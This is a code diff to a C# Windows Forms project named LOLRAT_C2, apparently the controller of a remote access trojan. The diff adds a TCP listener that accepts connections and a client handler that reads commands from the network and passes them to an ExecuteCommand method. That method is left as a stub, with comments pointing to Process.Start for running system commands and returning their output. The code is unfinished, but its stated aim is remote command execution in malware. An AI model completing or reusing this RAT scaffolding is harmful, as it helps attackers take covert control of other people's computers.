@@ -7,6 +7,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.Text;
+using System.IO;
 
 namespace LOLRAT_C2
 {
@@ -94,6 +95,91 @@ namespace LOLRAT_C2
             }
         }
 
+
+        private void StartListener(int port)
+        {
+            try
+            {
+                server = new TcpListener(IPAddress.Any, port);
+                server.Start();
+                UpdateStatus($"Listening on port {port}...");
+
+                Thread listenerThread = new Thread(() =>
+                {
+                    while (isListening)
+                    {
+                        try
+                        {
+                            TcpClient client = server.AcceptTcpClient();
+                            connectedClients.Add(client);
+                            UpdateStatus($"Client connected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");
+
+                            Thread clientThread = new Thread(() => HandleClient(client));
+                            clientThread.Start();
+                        }
+                        catch (SocketException)
+                        {
+                            // Handle exceptions as needed.
+                        }
+                    }
+                });
+
+                listenerThread.Start();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Error starting listener: {ex.Message}");
+            }
+        }
+
+        private void HandleClient(TcpClient client)
+        {
+            try
+            {
+                NetworkStream stream = client.GetStream();
+                StreamReader reader = new StreamReader(stream, Encoding.UTF8);
+                StreamWriter writer = new StreamWriter(stream, Encoding.UTF8);
+
+                while (isListening)
+                {
+                    try
+                    {
+                        string command = reader.ReadLine();
+                        if (string.IsNullOrEmpty(command))
+                        {
+                            break; // Client disconnected
+                        }
+
+                        // Execute the command
+                        string result = ExecuteCommand(command);
+
+                        // Send the result back to the client
+                        writer.WriteLine(result);
+                        writer.Flush();
+                    }
+                    catch (IOException)
+                    {
+                        // Handle exceptions as needed.
+                    }
+                }
+
+                client.Close();
+                connectedClients.Remove(client);
+                UpdateStatus($"Client disconnected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");
+            }
+            catch (Exception ex)
+            {
+                // Handle exceptions as needed.
+            }
+        }
+
+        private string ExecuteCommand(string command)
+        {
+            // Implement command execution here.
+            // You can use Process.Start to execute system commands.
+            // Make sure to capture the command's output and return it as a result.
+            return "Command execution result";
+        }
 
 
         private void UpdateStatus(string message)
